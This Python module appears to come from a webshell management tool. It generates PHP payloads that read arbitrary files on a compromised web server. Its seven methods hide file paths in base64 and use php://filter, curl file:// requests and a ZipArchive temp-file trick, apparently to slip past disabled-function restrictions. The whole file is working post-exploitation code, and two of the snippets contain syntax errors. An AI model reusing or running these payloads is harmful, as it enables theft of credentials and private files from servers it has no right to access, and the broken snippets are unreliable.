from libs.config import gget
from libs.myapp import base64_encode, uuid4


def get_php_cat(file_path, read_method):

    php_code = ""
    if read_method == 1:
        php_code = f"print(file_get_contents(base64_decode('{base64_encode(file_path)}')));"
    if read_method == 2:
        php_code = f"readfile(base64_decode('{base64_encode(file_path)}'));"
    if read_method == 3:
        php_code = f"$n=base64_decode('{base64_encode(file_path)}');$f=fopen($n),'r');print(fread($f, filesize($n)));fclose($f);"
    if read_method == 4:
        php_code = f"""
        $d=new DOMDocument();
        $d->loadHTMLFile("php://filter/convert.base64-encode/resource=".base64_decode('{base64_encode(file_path)}'));
        $d->loadXML($d->saveXML());
        print(base64_decode($d->getElementsByTagName("p")[0]->textContent));"""
    if read_method == 5:
        php_code = f"""$d=new SplFileObject("php://filter/convert.base64-decode/resource={base64_encode(file_path)}");print($d->fread($d->getsize())); """
    if read_method == 6:
        php_code = f"""
        $c=@curl_init();
        @curl_setopt($c,CURLOPT_URL,'file:///'.base64_decode('{base64_encode(file_path)}');
        @curl_exec($c);
        @curl_close($c);"""
    if read_method == 7:
        tmp_file = gget(
            "webshell.upload_tmp_dir",
            namespace="webshell") + uuid4()
        php_code = f"""
        $f=base64_decode('{base64_encode(file_path)}');
        $p="{tmp_file}";
        $z=@new ZipArchive();
        @$z->open($p,ZipArchive::CREATE);
        @$z->addFile($f);
        @$z->close();
        @$z->open($p);
        print(@$z->getFromName($f));
        @$z->close();
        @new ZipArchive($p,ZipArchive::OVERWRITE);
        """

    return php_code
